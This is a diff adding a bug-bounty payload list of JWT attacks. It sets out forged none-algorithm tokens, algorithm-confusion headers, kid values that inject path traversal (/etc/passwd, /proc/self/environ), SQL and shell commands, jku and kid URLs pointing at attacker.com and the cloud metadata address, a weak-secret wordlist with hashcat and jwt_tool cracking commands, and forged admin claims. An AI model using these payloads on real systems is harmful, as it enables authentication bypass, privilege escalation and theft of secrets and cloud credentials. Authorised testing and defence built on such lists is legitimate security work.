@@ -1,0 +1,166 @@
+# JWT Attack Payloads — Bug Bounty Edition
+# Sources: PayloadsAllTheThings, JWTAuditor, swisskyrepo, real CVE writeups (CVE-2026-22817, CVE-2026-23993, etc.)
+# Categories: None Algorithm, Algorithm Confusion, Kid Injection, JKU/JWK, Brute Force, Claims
+
+# ============================================================
+# SECTION 1: NONE ALGORITHM ATTACK
+# ============================================================
+
+# --- Basic None Algorithm ---
+# Header: {"alg":"none","typ":"JWT"}
+# Signature: (empty)
+# eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.
+# Note: no signature (ends with period)
+
+# --- None Algorithm Variations ---
+{"alg":"None","typ":"JWT"}
+{"alg":"NONE","typ":"JWT"}
+{"alg":"nOnE","typ":"JWT"}
+{"alg":"none","typ":"JWT"}
+{"alg":"None","typ":"JWT","kid":"test"}
+{"alg":"none","typ":"JWT","b64":false,"crit":["b64"]}
+
+# --- Token Construction ---
+# Header base64: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0
+# Payload base64: eyJ1c2VyIjogImFkbWluIiwgInJvbGUiOiAiYWRtaW4ifQ
+# Full token: HEADER.PAYLOAD.
+
+# ============================================================
+# SECTION 2: ALGORITHM CONFUSION (RS256 → HS256)
+# ============================================================
+
+# --- Algorithm Swap Attack ---
+# Step 1: Obtain the public key (from /.well-known/jwks.json or other source)
+# Step 2: Change header from RS256 to HS256
+# Step 3: Sign using the PUBLIC key as HMAC secret
+
+# --- Forged Header ---
+{"alg":"HS256","typ":"JWT"}
+{"alg":"HS384","typ":"JWT"}
+{"alg":"HS512","typ":"JWT"}
+
+# --- Public Key Extraction Endpoints ---
+/.well-known/jwks.json
+/.well-known/jwks
+/.well-known/openid-configuration
+/jwks.json
+/api/jwks
+/auth/jwks
+
+# ============================================================
+# SECTION 3: KID (KEY ID) INJECTION
+# ============================================================
+
+# --- Path Traversal in kid ---
+{"alg":"HS256","typ":"JWT","kid":"../../public/css/main.css"}
+{"alg":"HS256","typ":"JWT","kid":"/dev/null"}
+{"alg":"HS256","typ":"JWT","kid":"/proc/self/environ"}
+{"alg":"HS256","typ":"JWT","kid":"/etc/passwd"}
+{"alg":"HS256","typ":"JWT","kid":"/var/www/html/config.php"}
+# If server loads file at kid path and uses its content as symmetric key,
+# you can use a known file to generate the same key.
+
+# --- SQL Injection in kid ---
+{"alg":"HS256","typ":"JWT","kid":"' UNION SELECT 'key' --"}
+{"alg":"HS256","typ":"JWT","kid":"' OR '1'='1"}
+{"alg":"HS256","typ":"JWT","kid":"admin' --"}
+
+# --- Command Injection in kid ---
+{"alg":"HS256","typ":"JWT","kid":"$(whoami)"}
+{"alg":"HS256","typ":"JWT","kid":"`whoami`"}
+
+# --- URL-based kid ---
+{"alg":"HS256","typ":"JWT","kid":"https://attacker.com/key.pem"}
+{"alg":"HS256","typ":"JWT","kid":"http://169.254.169.254/latest/meta-data/"}
+
+# ============================================================
+# SECTION 4: JKU / JWK INJECTION
+# ============================================================
+
+# --- JKU (JWK Set URL) Injection ---
+# Point JKU to attacker-controlled JWKS:
+{"alg":"RS256","typ":"JWT","jku":"https://attacker.com/jwks.json"}
+{"alg":"RS256","typ":"JWT","jku":"http://169.254.169.254/latest/meta-data/"}
+{"alg":"RS256","typ":"JWT","jku":"file:///etc/passwd"}
+
+# --- JWK (Embedded Key) Injection ---
+# Embed attacker's public key directly in JWT header:
+# {
+#   "alg":"RS256",
+#   "typ":"JWT",
+#   "jwk": {
+#     "kty":"RSA",
+#     "n":"<attacker-modulus>",
+#     "e":"AQAB",
+#     "kid":"attacker-key"
+#   }
+# }
+
+# --- Self-Signed JWK via jwks-rsa library ---
+# If library trusts the embedded JWK, attacker signs with their own private key
+# and the server verifies using the attacker's embedded public key.
+
+# ============================================================
+# SECTION 5: WEAK SECRET BRUTE FORCE
+# ============================================================
+
+# --- Common Weak Secrets ---
+secret
+123456
+password
+abc123
+changeme
+admin
+secret123
+mysecret
+supersecret
+jwt_secret
+JWT_SECRET
+token
+key
+private_key
+secret_key
+super_secret
+
+# --- Brute Force with hashcat ---
+# hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
+# hashcat -m 16500 jwt.txt ?l?l?l?l?l?l  (brute force 6 lowercase chars)
+
+# --- Known JWT Secrets List ---
+# https://github.com/wallarm/jwt-secrets
+
+# ============================================================
+# SECTION 6: CLAIMS MANIPULATION
+# ============================================================
+
+# --- Common Claims to Forge ---
+{"sub":"admin","role":"admin"}
+{"sub":"admin","role":"admin","is_admin":true}
+{"sub":"admin","is_admin":true}
+{"sub":"admin","admin":true}
+{"sub":"admin","isAdmin":true}
+{"sub":"admin","scope":"admin"}
+{"sub":"admin","permissions":["read:*","write:*"]}
+{"sub":"admin","groups":["administrators"]}
+{"sub":"admin","email":"admin@target.com","email_verified":true}
+{"sub":"admin","roles":["admin"]}
+
+# --- Expiration Bypass ---
+{"sub":"admin","role":"admin","exp":9999999999}
+{"sub":"admin","role":"admin","exp":0}  # some libraries treat 0 as no expiry
+
+# --- Issuer / Audience Manipulation ---
+{"sub":"admin","iss":"https://attacker.com","aud":"target"}
+{"sub":"admin","iss":"target","aud":"admin"}
+
+# ============================================================
+# SECTION 7: JWT TOOLS
+# ============================================================
+# jwt_tool:     python3 jwt_tool.py <JWT> -T (tamper)
+#               python3 jwt_tool.py <JWT> -X a (alg none)
+#               python3 jwt_tool.py <JWT> -X k (kid injection)
+#               python3 jwt_tool.py <JWT> -X j (jku injection)
+#               python3 jwt_tool.py <JWT> -C (crack HMAC secret)
+# jwt-cracker:  python3 jwt-cracker.py <JWT> <wordlist>
+# hashcat:      hashcat -m 16500 <jwt_file> <wordlist>
+# jwk-to-pem:   python3 -c "from jwkest.jwk import RSAKey; k = RSAKey(kid='x'); print(k.alg)"
